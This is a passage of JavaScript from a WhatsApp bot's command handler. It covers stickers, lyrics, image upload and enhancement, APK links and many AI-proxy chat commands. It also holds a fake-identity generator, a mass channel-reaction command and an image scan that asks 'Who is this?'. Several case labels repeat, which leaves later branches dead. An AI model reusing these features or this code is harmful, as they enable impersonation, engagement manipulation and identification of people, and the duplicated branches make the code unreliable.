            packname: 'BIG DADDY V3 ✨', 
            author: 'Phistar Official' 
        });
    } else {
        return replyphistar(`Send an image or video with caption ${prefix + command}. Video should be 1-9 seconds.`);
    }
    break;
}

case 'stickersearch':
case 'stickerpack': {
    if (!text) return replyphistar(`❗ Example: ${prefix + command} <search-query>\nE.g., ${prefix + command} cute cat`);

    try {
        await replyphistar(`🔍 *BIG DADDY V3 is searching stickers...*\nPlease wait ⏳`);

        const apiUrl = `https://www.dark-yasiya-api.site/download/sticker?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        const { status, result } = response.data;
        if (!status || !result || !result.stickers) {
            return replyphistar(`❌ Phistar couldn't find stickers for: *${text}*`);
        }

        const { stickers } = result;

        for (const stickerUrl of stickers) {
            const media = await axios.get(stickerUrl, { responseType: 'arraybuffer' });
            await PhistarBotInc.sendImageAsSticker(m.chat, Buffer.from(media.data), m, {
                packname: 'BIG DADDY V3 Stickers',
                author: 'Phistar Network'
            });
        }

        replyphistar(`🎉 *BIG DADDY V3 successfully sent ${stickers.length} ${text} stickers!*\nPowered by Phistar ⚡`);
    } catch (error) {
        console.error('Phistar Sticker Error:', error.message);
        replyphistar(`❌ BIG DADDY V3 failed to fetch stickers. Try again later!`);
    }
    break;
}
case 'readmore': {
    const more = String.fromCharCode(8206);
    const readmore = more.repeat(4001);
    
    let [leftText, rightText] = text.split('|');
    if (!leftText) leftText = '';
    if (!rightText) rightText = '';
    
    const fullText = leftText + readmore + rightText;
    
    PhistarBotInc.sendMessage(m.chat, {
        text: fullText
    }, { quoted: m });
    break;
}
case 'onlinecountries': {
    replyphistar("🌍 Fetching available countries...");

    try {
        const countries = await getOnlineCountries(); // Fetch all online countries
        if (countries.length === 0) {
            replyphistar("❌ No online countries available at the moment.");
            break;
        }

        // Generate a professional list of countries
        const countryList = countries
            .map(c => `🌍 *Country:* ${c.name}\n   Code: ${c.code}`)
            .join("\n\n");
        replyphistar(`🌍 *Available Online Countries:*\n\n${countryList}`);
    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch available countries. Please try again later.");
    }
    break;
}
case 'lyrics': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} faded | Alan Walker`);

    try {
        // Extract song title and artist from input
        const [title, artist] = text.split('|').map(str => str.trim());
        if (!title || !artist) return replyphistar(`*Please provide both song title and artist, e.g.:* ${prefix + command} faded | Alan Walker`);

        // Notify user that the bot is fetching lyrics
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎶`, key: m.key } });
        await replyphistar(`Searching for lyrics...`);

        // Fetch lyrics from API
        const apiUrl = `https://api.davidcyriltech.my.id/lyrics?t=${encodeURIComponent(title)}&a=${encodeURIComponent(artist)}`;
        const response = await axios.get(apiUrl);

        if (response.data && response.data.lyrics) {
            const { title, artist, lyrics } = response.data;

            // Format the lyrics response
            const lyricsMessage = `🎵 *LYRICS FOUND*\n\n` +
                                  `*🎶 Song:* ${title}\n` +
                                  `*🎤 Artist:* ${artist}\n\n` +
                                  `${lyrics}\n`;

            // Send lyrics to the user
            replyphistar(lyricsMessage);
        } else {
            replyphistar(`*No lyrics found for:* ${title} by ${artist}`);
        }
    } catch (error) {
        console.error('Error fetching lyrics:', error);
        replyphistar(`*Failed to fetch lyrics. Possible reasons:*\n1. Invalid title or artist.\n2. API issues.\n\n*Error Details:* ${error.message}`);
    }
    break;
}
case 'hdimg': case 'remini': {
    // Check if the command is a reply to an image
    if (!/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    if (!quoted) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .remini to enhance it*`);
    }

    try {
        // Download the image locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image to Catbox to get a public URL
        const uploadResponse = await uploadFile(mediaPath); // Using Catbox uploader

        if (!uploadResponse || !uploadResponse.url) {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> Failed to upload the image to Catbox.`);
        }

        const imageUrl = uploadResponse.url; // Get the uploaded image URL

        // Use the Remini API with the uploaded image URL
        const enhancedImageUrl = `https://bk9.fun/tools/enhance?url=${imageUrl}`;

        // Send the enhanced image back to the user
        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: enhancedImageUrl },
            caption: `*SUCCESSFULLY ENHANCED YOUR IMAGE 😍!!*\n\n`
        }, { quoted: m });

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in Remini command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}
case 'reactchan': {
    if (!text) return replyphistar(`Usage example:\n${prefix + command} https://whatsapp.com/channel/xxx/123 ❤️\n${prefix + command} https://whatsapp.com/channel/xxx/123 phistar 5`);

    const letterStyle = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const args = text.trim().split(/\s+/); // split by spaces
    const link = args[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
        return replyphistar(`Invalid link!\nExample: ${prefix + command} https://whatsapp.com/channel/xxx/123 ❤️ 5`);
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return replyphistar("The link is incomplete!");

    // Check remaining arguments
    const remaining = args.slice(1);
    if (remaining.length === 0) return replyphistar("Enter the text or emoji to react with.");

    let offset = 1;
    let lastArg = remaining[remaining.length - 1];
    if (!isNaN(lastArg)) {
        offset = parseInt(lastArg);
        remaining.pop(); // Remove number from the text array
    }

    const reactionText = remaining.join(' ').trim();
    if (!reactionText) return replyphistar("Enter text/emoji to react with.");

    const emoji = reactionText.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return letterStyle[c] || c;
    }).join('');

    try {
        const metadata = await PhistarBotInc.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await PhistarBotInc.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        replyphistar(`Successfully reacted with *${emoji}* to ${success} message(s) in channel *${metadata.name}*\nFailed on ${failed} message(s)`);
    } catch (err) {
        replyphistar("Failed to process the request! Please check the channel link or try again.");
    }
    break;
}

case 'fakeid': {
    let count = args[0] ? parseInt(args[0]) : 5;
    if (isNaN(count) || count <= 0) count = 5;

    // React to indicate processing
    await PhistarBotInc.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

    try {
        let apiUrl = `https://api.siputzx.my.id/api/tools/fake-data?type=person&count=${count}`;
        let response = await fetch(apiUrl);
        let data = await response.json();

        if (!data.status || !data.data.length) {
            await PhistarBotInc.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
            return replyphistar(`Unable to generate fake IDs at the moment. Please try again.`);
        }

        for (let person of data.data) {
            let caption = `*🔹 FAKE IDENTITY 🔹*\n\n` +
                `▪️ **Name:** ${person.name}\n` +
                `▪️ **Email:** ${person.email}\n` +
                `▪️ **Phone:** ${person.phone}\n` +
                `▪️ **Birth Date:** ${person.birthDate.split("T")[0]}\n` +
                `▪️ **Gender:** ${person.gender}`;

            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: person.avatar },
                caption: caption
            }, { quoted: m });

            // Small delay to prevent spam blocking
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        // React to indicate success
        await PhistarBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    } catch (error) {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        replyphistar(`An error occurred: ${error.message}`);
    }
    break;
}
case 'imgscan': {
    if (!/image/.test(mime)) {
        return replyphistar(`*❌ REQUEST ERROR!*\n\n> Please reply to an image with *${prefix}imgscan* to scan it.`);
    }

    if (!quoted) {
        return replyphistar(`*❌ REQUEST ERROR!*\n\n> Please reply to an image with *${prefix}imgscan* to scan it.`);
    }

    try {
        // Download the image locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the image (replace with your upload function)
        const uploadResponse = await uploadToImgur(mediaPath); // Ensure you have this function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return replyphistar(`*❌ UPLOAD ERROR!*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl;

        // Call the Gemini API for image analysis
        const apiResponse = await axios.get(`https://bk9.fun/ai/geminiimg`, {
            params: { url: imageUrl, q: "Who is this?" }
        });

        if (apiResponse.data.status) {
            const result = apiResponse.data.BK9;

            // Send the result to the user
            replyphistar(`*🔍 IMAGE SCAN RESULT:*\n\n${result}`);
        } else {
            replyphistar(`*❌ SCANNER ERROR!*\n\n> Unable to process the image. Please try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in imgscan command:', error);
        replyphistar(`*❌ AN ERROR OCCURRED!*\n\n> ${error.message}`);
    }
    break;
}
case 'imgsearch': case 'img': {
    if (!text) {
        return replyphistar(`*Usage:* .bingimg <query>\n\n*Example:* .img cat`);
    }

    try {
        // Call the Bing Image Search API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/s/bimg`, {
            params: { query: text }
        });

        if (apiResponse.status === 200 && apiResponse.data.status) {
            const images = apiResponse.data.data;

            if (images.length === 0) {
                return replyphistar(`No images found for "${text}". Please try another query.`);
            }

            // Send up to 5 images
            const maxImages = Math.min(images.length, 5);
            for (let i = 0; i < maxImages; i++) {
                await PhistarBotInc.sendMessage(m.chat, {
                    image: { url: images[i] },
                    caption: `🔎 *Image Search Results*\n\n📄 *Query:* "${text}"\n📷 *Image ${i + 1}/${maxImages}*`,
                }, { quoted: m });
            }
        } else {
            replyphistar(`❌ *ERROR:* Failed to fetch images. Please try again.`);
        }
    } catch (error) {
        console.error('Error in Image Search command:', error);
        replyphistar(`❌ *AN ERROR OCCURRED:* ${error.message}`);
    }
    break;
}
case 'url': {
    // Validate that the message is a reply to an image or video
    if (!quoted || !/video/.test(mime) && !/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE:*\n\n> *Reply/Send Image/Video With Caption .url*`);
    }

    try {
        // Download the media locally
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Upload the file to uploadFile
        const uploadResponse = await uploadFile(mediaPath);

        // Check upload response and send the result
        if (uploadResponse && uploadResponse.url) {
            await PhistarBotInc.sendMessage(m.chat, {
                text: `*UPLOAD SUCCESSFUL!!*\n\n> *URL:*\n\n${uploadResponse.url}`
            }, { quoted: m });
        } else {
            await replyphistar(`*UPLOAD FAILED, PLEASE TRY AGAIN*`);
        }

        // Clean up: Remove the saved media file after processing
        fs.unlinkSync(mediaPath);
    } catch (error) {
        console.error('Error in URL command:', error);
        await replyphistar(`*AN ERROR OCCURRED!! MESSAGE:*\n\n> ${error.message}`);
    }
    break;
}
    case "apk":
case "apkdl": {
    if (!text) return replyphistar("✨ *Please specify the APK you want to download!*");

    try {
        // Fetch APK search results
        let kyuu = await fetchJson(`https://bk9.fun/search/apk?q=${text}`);
        if (!kyuu.BK9 || kyuu.BK9.length === 0) {
            return replyphistar("❌ *No APKs found for the given search query.*");
        }

        // Fetch APK download link
        let tylor = await fetchJson(`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
        
        // Send download link
        const downloadMessage = `🎮 *APK Download Link*\n\n` +
                                `📦 *Name:* ${tylor.BK9.name}\n` +
                                `🔗 *Download Link:* [Click Here](${tylor.BK9.dllink})\n`;

        await PhistarBotInc.sendMessage(
            m.chat,
            {
                text: downloadMessage,
                contextInfo: {
                    externalAdReply: {
                        title: `Download APK: ${tylor.BK9.name}`,
                        body: "Click the link to download the APK!",
                        thumbnailUrl: tylor.BK9.thumb, // Using the app's URL thumbnail image
                        sourceUrl: tylor.BK9.dllink,
                        mediaType: 2,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            },
            { quoted: m }
        );
    } catch (error) {
        console.error('Error in APK command:', error);
        replyphistar("❌ *An error occurred while processing the request. Please try again later.*");
    }
    break;
}
case 'screenshot': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} link`);

    try {
        // Construct the API URL for the screenshot
        const apiUrl = `https://api.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}&device=tablet`;

        // Fetch the screenshot from the API
        const apiResponse = await axios.get(apiUrl);

        // Check if the API response indicates success
        if (apiResponse.data && apiResponse.data.success) {
            const { screenshotUrl } = apiResponse.data;

            // Send the screenshot back to the user
            await PhistarBotInc.sendMessage(
                m.chat,
                {
                    image: { url: screenshotUrl },
                    caption: `🖼️ *Web Screenshot* \n\n🌐 URL: ${text}\n📱 Device: Tablet`,
                },
                { quoted: m }
            );
        } else {
            // If the API response does not indicate success, reply with an error message
            replyphistar(`*Failed to capture the screenshot! Please check the URL and try again.*`);
        }
    } catch (error) {
        // Log the error for debugging purposes
        console.error('Error during ssweb command:', error);

        // Reply with a generic error message
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
//AI V3
    case 'chatgpt': case 'gpt': case 'llama': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(
            `https://api.giftedtech.co.ke/api/ai/mistral?apikey=gifted&q=${encodeURIComponent(text)}`
        );

        if (response.data && response.data.success) {
            replyphistar(response.data.result);  // <-- use .result
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌ API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}
// Add these cases to your command handler
case 'chatbot-dm': {
  if (!isAdmins && !isCreator) return replyphistar(mess.admin);
  
  const phoneNumber = PhistarBotInc.user.id.split(':')[0];
  const chatbotConfig = getChatbotConfig(phoneNumber);
  const state = args[0]?.toLowerCase();
  
  if (!state || (state !== 'on' && state !== 'off')) {
    return replyphistar(`❌ Usage: ${prefix}chatbot-dm on/off\n\nCurrent DM chatbot: ${chatbotConfig.dm ? 'ON' : 'OFF'}`);
  }
  
  const newState = state === 'on';
  updateChatbotConfig(phoneNumber, { dm: newState });
  
  // Enable overall chatbot if turning on any mode
  if (newState && !chatbotConfig.enabled) {
    updateChatbotConfig(phoneNumber, { enabled: true });
  }
  
  // Disable overall chatbot if both modes are off
  if (!newState && chatbotConfig.group === false) {
    updateChatbotConfig(phoneNumber, { enabled: false });
  }
  
  replyphistar(`✅ Chatbot in DM has been turned ${newState ? 'ON' : 'OFF'} for this WhatsApp account.`);
  break;
}

case 'chatbot-group': {
  if (!isAdmins && !isCreator) return replyphistar(mess.admin);
  
  const phoneNumber = PhistarBotInc.user.id.split(':')[0];
  const chatbotConfig = getChatbotConfig(phoneNumber);
  const state = args[0]?.toLowerCase();
  
  if (!state || (state !== 'on' && state !== 'off')) {
    return replyphistar(`❌ Usage: ${prefix}chatbot-group on/off\n\nCurrent group chatbot: ${chatbotConfig.group ? 'ON' : 'OFF'}`);
  }
  
  const newState = state === 'on';
  updateChatbotConfig(phoneNumber, { group: newState });
  
  // Enable overall chatbot if turning on any mode
  if (newState && !chatbotConfig.enabled) {
    updateChatbotConfig(phoneNumber, { enabled: true });
  }
  
  // Disable overall chatbot if both modes are off
  if (!newState && chatbotConfig.dm === false) {
    updateChatbotConfig(phoneNumber, { enabled: false });
  }
  
  replyphistar(`✅ Chatbot in groups has been turned ${newState ? 'ON' : 'OFF'} for this WhatsApp account.`);
  break;
}

case 'chatbot-status': {
  const phoneNumber = PhistarBotInc.user.id.split(':')[0];
  const chatbotConfig = getChatbotConfig(phoneNumber);
  
  replyphistar(
    `🤖 Chatbot Status for this WhatsApp account:\n\n` +
    `• Overall: ${chatbotConfig.enabled ? '🟢 ENABLED' : '🔴 DISABLED'}\n` +
    `• DM: ${chatbotConfig.dm ? '🟢 ON' : '🔴 OFF'}\n` +
    `• Groups: ${chatbotConfig.group ? '🟢 ON' : '🔴 OFF'}\n\n` +
    `Use:\n• ${prefix}chatbot-dm on/off\n• ${prefix}chatbot-group on/off`
  );
  break;
}

case 'chatgpt4': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    // Show typing indicator
    await PhistarBotInc.sendPresenceUpdate('composing', m.chat);
    
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(text)}`,
      { timeout: 30000 }
    );

    if (response.data && response.data.success) {
      replyphistar(response.data.result);
    } else {
      replyphistar(`❌ Failed to get a response from the AI.`);
    }
    
    // Stop typing indicator
    await PhistarBotInc.sendPresenceUpdate('paused', m.chat);
    
  } catch (error) {
    console.error("❌ ChatGPT API Error:", error);
    replyphistar(`❌ An error occurred while fetching the response. Please try again later.`);
  }
  break;
}
case 'chatgpt4': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    if (response.data && response.data.success) {
      replyphistar(response.data.result);
    } else {
      replyphistar(`❌ Failed to get a response.`);
    }
  } catch (error) {
    console.error("❌ API Error:", error);
    replyphistar(`❌ An error occurred while fetching the response.`);
  }
  break;
}
case 'chatgpt4o': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/gpt4o?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    if (response.data && response.data.success) {
      replyphistar(response.data.result);
    } else {
      replyphistar(`❌ Failed to get a response.`);
    }
  } catch (error) {
    console.error("❌ API Error:", error);
    replyphistar(`❌ An error occurred while fetching the response.`);
  }
  break;
}
case 'deepseek': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/deepseek-v3?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    console.log("Deepseek-v3 raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ Failed to get a response. Response was: ${JSON.stringify(response.data)}`);
    }
  } catch (error) {
    console.error("❌ Deepseek-v3 API Error:", error);
    replyphistar(`❌ An error occurred while contacting Deepseek-v3: ${error.message}`);
  }
  break;
}
case 'deepseek-r1': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/deepseek-r1?apikey=gifted&q=${encodeURIComponent(text)}`
    );

    console.log("Deepseek-r1 raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ Failed to get a valid response. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ Deepseek-r1 API Error:", error.response ? error.response.data : error.message);
    replyphistar(`❌ An error occurred while contacting DeepSeek-R1: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'geminiapro': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/geminiaipro?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("GeminiAIPRO raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response: ${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ GeminiAIPRO API Error:", error.response ? error.response.data : error.message);
    replyphistar(`❌ An error occurred while contacting GeminiAIPRO: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'blackbox': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/blackbox?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("Blackbox raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ Blackbox API Error:", error.response ? error.response.data : error.message);
    replyphistar(`❌ An error occurred while contacting Blackbox: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'openai': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/openai?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("OpenAI raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ OpenAI API Error:", error.response ? JSON.stringify(error.response.data) : error.message);
    replyphistar(`❌ An error occurred while contacting OpenAI endpoint: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'chatai': {
  if (!text) {
    return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);
  }

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/chat?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("Chat endpoint raw data:", response.data);

    if (response.data && response.data.success) {
      replyphistar(response.data.result || JSON.stringify(response.data, null, 2));
    } else {
      replyphistar(`❌ No valid success flag. Full response:\n${JSON.stringify(response.data, null, 2)}`);
    }
  } catch (error) {
    console.error("❌ Chat API Error:", error.response ? JSON.stringify(error.response.data) : error.message);
    replyphistar(`❌ An error occurred while contacting Chat endpoint: ${error.response ? JSON.stringify(error.response.data) : error.message}`);
  }
  break;
}
case 'fluximg': {
  if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} a sunset over the mountains`);

  await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

  try {
    const { data, status } = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/fluximg?apikey=gifted&prompt=${encodeURIComponent(text)}`
    );
    console.log("fluximg response status:", status);
    console.log("fluximg response data:", data);

    if (data && (data.success || data.result || data.url)) {
      // Adjust based on actual field returned (result, image, url, etc.)
      return replyphistar(`🖼 Flux Image:\n${data.result || data.url}`);
    } else {
      return replyphistar(
        `❌ fluximg endpoint responded unexpectedly.\n\nStatus: ${status}\nResponse: ${JSON.stringify(data, null, 2)}`
      );
    }
  } catch (err) {
    console.error("fluximg API error:", err.response ? err.response.data : err.message);
    return replyphistar(
      `❌ An error occurred while contacting fluximg.\n\n${err.response ? JSON.stringify(err.response.data) : err.message}`
    );
  }
  break;
}
case 'metai': {
  if (!text) return replyphistar(`❌ Please provide a prompt. Example: ${prefix + command} hey Llama`);

  await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

  try {
    const response = await axios.get(
      `https://api.giftedtech.co.ke/api/ai/meta-llama?apikey=gifted&q=${encodeURIComponent(text)}`
    );
    console.log("meta-llama status:", response.status);
    console.log("meta-llama response:", response.data);

    if (response.data && (response.data.success || response.data.result)) {
      replyphistar(`Meta-Llama says:\n${response.data.result}`);
    } else {
      replyphistar(
        `❌ Unexpected response from meta-llama.\nStatus: ${response.status}\nBody: ${JSON.stringify(response.data, null, 2)}`
      );
    }
  } catch (err) {
    console.error("meta-llama error:", err.response ? err.response.data : err.message);
    replyphistar(`❌ Error calling meta-llama:\n${err.response ? JSON.stringify(err.response.data, null, 2) : err.message}`);
  }
  break;
}
case 'vision': {
    if (!quoted || !/image/.test(mime)) {
        return replyphistar(`*REQUEST ERROR!!*\n\n> Reply to an *image* with:\n> *${prefix + command} your caption*`);
    }

    if (!text) {
        return replyphistar(`*CAPTION REQUIRED!!*\n\n> Reply to an image with:\n> *${prefix + command} your description*`);
    }

    await PhistarBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m.key } });

    try {
        // Step 1: Download image
        const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);

        // Step 2: Upload to Catbox
        const uploadResponse = await uploadFile(mediaPath);
        if (!uploadResponse?.url) {
            fs.unlinkSync(mediaPath);
            return replyphistar(`*UPLOAD FAILED!!*\n\n> Couldn't upload image to Catbox.`);
        }

        const imageUrl = uploadResponse.url;

        // Step 3: Send request to Gifted Vision API
        const apiUrl = `https://api.giftedtech.co.ke/api/ai/vision?apikey=gifted&url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);

        // Step 4: Clean up
        fs.unlinkSync(mediaPath);

        // Step 5: Reply with Vision AI response
        if (data && (data.success || data.status === 200)) {
            replyphistar(`*🎨 Vision AI Result*\n\n${data.result}`);
        } else {
            replyphistar(`❌ Vision AI didn't respond properly.\n\nResponse: ${JSON.stringify(data, null, 2)}`);
        }

    } catch (error) {
        console.error("❌ Vision API Error:", error);
        replyphistar(`❌ An error occurred while processing the vision request.\n\n${error.message}`);
    }
    break;
}

case 'claude': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.giftedtech.co.ke/api/ai/gpt?apikey=gifted&q=${encodeURIComponent(text)}`);
        
        if (response.data) {
            replyphistar(`${response.data.response || response.data.data || response.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'dbrx': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/dbrx-instruct?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'metai': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'hermes': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/nous-hermes?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'blackbox': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/blackboxai-pro?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'deepseek': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/deepseek-llm-67b-chat?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'deepseekr1': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
        let response = await axios.get(`https://api.siputzx.my.id/api/ai/deepseek-r1?content=${encodeURIComponent(text)}`);
        
        if (response.data && response.data.status) {
            replyphistar(`${response.data.data}`);
        } else {
            replyphistar(`❌ Failed to get a response.`);
        }
    } catch (error) {
        console.error("❌API Error:", error);
        replyphistar(`❌ An error occurred while fetching the response.`);
    }
    break;
}

case 'gemini2': {
    if (!text) return replyphistar(`❌ Please provide a prompt.\n\nExample: ${prefix + command} Hello`);

    try {
